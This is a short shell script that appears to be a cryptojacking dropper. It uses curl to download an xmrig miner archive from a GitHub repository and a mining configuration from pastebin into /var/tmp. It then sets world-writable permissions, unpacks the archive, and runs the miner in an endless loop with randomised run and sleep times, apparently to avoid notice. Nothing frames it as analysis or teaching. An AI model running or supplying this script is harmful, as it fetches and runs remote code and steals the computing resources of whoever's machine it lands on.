#!/bin/sh
curl -o /var/tmp/xmrig -L https://github.com/mtverraen/clusterduck/raw/main/file.tar.gz
curl -o /var/tmp/config.json https://pastebin.com/raw/9sxsXLrM
chmod 777 /var/tmp/xmrig
cd /var/tmp
tar -xvf xmrig
while :
  do
    timeout $(($(($RANDOM%(3600-600+1)))+600)) ./xmrig -c config.json
    sleep $(($(($RANDOM%(5000-600+1)))+600))
done

    
